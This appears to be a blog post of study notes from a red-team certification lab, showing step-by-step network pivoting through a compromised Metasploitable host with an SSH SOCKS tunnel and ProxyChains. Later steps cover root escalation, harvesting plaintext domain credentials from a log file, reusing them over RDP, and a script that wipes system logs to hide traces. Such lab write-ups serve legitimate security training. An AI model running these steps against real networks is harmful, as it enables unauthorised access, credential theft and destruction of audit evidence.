---
title: Network Pivoting
date: 2026-06-11
tags: [redteam, pivoting, proxychains]
category: offensive-security
categoryLabel: Offensive Security
cover: /logs/assets/PivotingandTunnelingVisualized.gif

---

Hi again! Hello there!

These notes were inspired by my journey preparing for the CRTA certification. They capture what I learned while working through the course materials and hands-on labs.

To be honest, I'll definitely come back and refine these notes in the future. At the time I wrote them, I didn't fully understand every concept, so think of them as a snapshot of my learning process rather than a complete reference.

One thing I did enjoy, though, was pivoting. It quickly became one of the most interesting parts of the labs and made me want to explore Active Directory attacks even further.

## What is Pivoting?
**Pivoting** = Using a compromised machine as a "stepping stone" to reach other machines on a network that you **cannot directly access** from your attacker machine.

#### Analogy
> **The Bridge Analogy:** Imagine there's an island (internal network) you can't swim to directly. But you already control a boat (compromised machine) that CAN reach it. Pivoting = **using that boat to get to the island.**

```
[ Kali Machine ]
        │
        │  You CAN reach this
        ▼
[ Compromised Machine — 192.168.50.3 ]
        │
        │ This machine CAN reach the internal network
        ▼
[ Internal Network — 10.10.10.x ]  ←  You CANNOT reach this directly
  [ Employee Machine ]
  [ App Server       ]
  [ Domain Controller]
```

###### Lab Environment

|Machine|IP|Role|
|---|---|---|
|Kali (Attacker)|192.168.50.2|Your machine|
|Metasploitable2|192.168.50.3|Compromised pivot machine|
|Internal Network|10.10.10.x|Hidden targets behind the pivot|
|Employee Machine (Win 10)|10.10.10.4|Internal target|
|App Server (Server 2012)|10.10.10.5|Internal target|
|Domain Controller|10.10.10.x|Internal target|


### STEP 1 — SSH into the Compromised Machine

```bash
ssh msfadmin@192.168.50.3
```

Just a normal SSH login. This gives you a shell on the pivot machine.



### STEP 2 — Create a SOCKS Proxy Tunnel (Dynamic Port Forwarding)

```bash
ssh -D 8090 msfadmin@192.168.50.3
```


*What does `-D 8090` actually do? (HOW & WHY)*

**`-D` = Dynamic Port Forwarding**

This command tells SSH to:

1. Open a **SOCKS proxy** on YOUR Kali machine at port `8090`
2. Any traffic you send to `127.0.0.1:8090` gets **encrypted** and forwarded through the SSH tunnel to `192.168.50.3`
3. From there, Metasploitable **relays your traffic** to the internal `10.10.10.x` network

```
[ Your Kali ]
     │
     │  You send traffic to 127.0.0.1:8090 (local SOCKS proxy)
     ▼
[ SSH Tunnel — Encrypted ]
     │
     ▼
[ Metasploitable 192.168.50.3 ]
     │
     │  Metasploitable forwards traffic as if IT is making the request
     ▼
[ Internal Target 10.10.10.x ]  ← Now reachable!
```

>  **Why this is powerful:** The internal targets only see traffic coming from `192.168.50.3` — they never know your Kali machine exists. You are **invisible** to the internal network.
>  **Why this is powerful:** The internal targets only see traffic coming from `192.168.50.3`, so they never know your Kali machine exists. You are **invisible** to the internal network.



### STEP 3 — Verify the Tunnel is Running

```bash
netstat -ant | grep 8090
```

**Expected output:**

```
tcp    0    0 127.0.0.1:8090    0.0.0.0:*    LISTEN
tcp6   0    0 ::1:8090          :::*         LISTEN
```

This confirms port `8090` is **LISTENING** on your local machine; the SOCKS proxy is active and ready.

---

### STEP 4 — Configure ProxyChains

ProxyChains is a tool that **forces any command/tool** to send its traffic through your SOCKS proxy tunnel.

```bash
nano /etc/proxychains.conf
```

At the bottom of the file under `[ProxyList]`, add:

```
socks4 127.0.0.1 8090
```

**What this means:**

- `socks4` = proxy type
- `127.0.0.1` = your local machine (where the tunnel is listening)
- `8090` = the port your SSH tunnel is on

>  **Think of ProxyChains as:** A traffic cop that intercepts every tool you run and says _"Wait — send this through the tunnel first."_

---

### STEP 5 — Reach Internal Machines Through the Tunnel

Now prefix any command with `proxychains` and it will travel through the pivot:

```bash
# Check if App Server port 80 is open
proxychains nc -nv 10.10.10.5 80

# Check if Employee Machine port 445 (SMB) is open
proxychains nc -nv 10.10.10.4 445
```

**ProxyChains output confirms the chain:**

```
D-chain|-<>-127.0.0.1:8090-<><>-10.10.10.5:80-<><>-OK
(UNKNOWN) [10.10.10.5] 80 (http) open : Operation now in progress
```

This means: `Your Kali → tunnel (8090) → Metasploitable → Internal Target` 

---

### STEP 6 — Escalate Privileges on Pivot Machine

Once inside Metasploitable via SSH:

```bash
sudo -i          # Escalate to root
whoami           # Confirm → root
ls               # List files
cd Desktop/
ls -la
```

---

### STEP 7 — Harvest Credentials from Pivot Machine

```bash
cat vnc.log
```

**Found credentials in vnc.log:**

```
username : cyberwarfare\employee
password : Password@963
```

>  **Why check logs?** Machines store credentials in log files, config files, and scripts. Always enumerate after gaining access — you never know what's left behind.

### STEP 8 — Clear Logs (Removing Footprints)

The `reset_logs.sh` script was found on the Desktop and is used to wipe evidence:

```bash
nano reset_logs.sh
```

What it does:

```bash
# Clears all major system logs
cd /var/log
for ii in $VARLOGS; do
    echo -n > $ii        # Empties each log file
    rm -f $ii.? $ii.?.gz # Removes rotated/compressed logs
done

/etc/init.d/samba stop
rm -f /var/log/samba/*
rm -f /var/lib/dhcp3/*
```

>  **Why this matters for Red Teaming:** Removing footprints = last phase of the kill chain. A good red teamer cleans up to simulate what a real attacker would do and avoid tipping off the blue team.

---

### STEP 9 — RDP into Internal Machine via ProxyChains

Using the harvested credentials to access the Employee Machine (Win 10) via RDP:

```bash
proxychains rdesktop 10.10.10.4
```

ProxyChains routes the RDP traffic through the tunnel:

```
D-chain|-<>-127.0.0.1:8090-<><>-10.10.10.4:3389-<><>-OK
```

RDP login screen appears for `EMP-MACHINE`; log in with:

- Username: `cyberwarfare\employee`
- Password: `Password@963`


## Full Pivoting Flow Summary

```
[ KALI ATTACKER ]
      │
      │ ssh -D 8090 msfadmin@192.168.50.3  ← Creates SOCKS tunnel
      ▼
[ METASPLOITABLE — 192.168.50.3 ]  ← The PIVOT
      │
      │ proxychains <any tool> 10.10.10.x  ← Traffic routed through pivot
      ▼
[ INTERNAL NETWORK — 10.10.10.x ]
  ├── Employee Machine (Win 10)   10.10.10.4  ← RDP 
  ├── App Server (2012)           10.10.10.5  ← HTTP 
  └── Domain Controller           10.10.10.x  ← Next target
```

---

## Quick Reference — Pivoting Cheatsheet

| Task                             | Command                                   |
| -------------------------------- | ----------------------------------------- |
| SSH into pivot machine           | `ssh msfadmin@<pivot-ip>`                 |
| Create SOCKS tunnel on port 8090 | `ssh -D 8090 msfadmin@<pivot-ip>`         |
| Verify tunnel is listening       | `netstat -ant \| grep 8090`               |
| Edit ProxyChains config          | `nano /etc/proxychains.conf`              |
| Add SOCKS proxy entry            | `socks4 127.0.0.1 8090`                   |
| Reach internal host via tunnel   | `proxychains nc -nv <internal-ip> <port>` |
| RDP to internal machine          | `proxychains rdesktop <internal-ip>`      |
| Escalate to root on pivot        | `sudo -i`                                 |
| Clear logs on pivot              | `bash reset_logs.sh`                      |










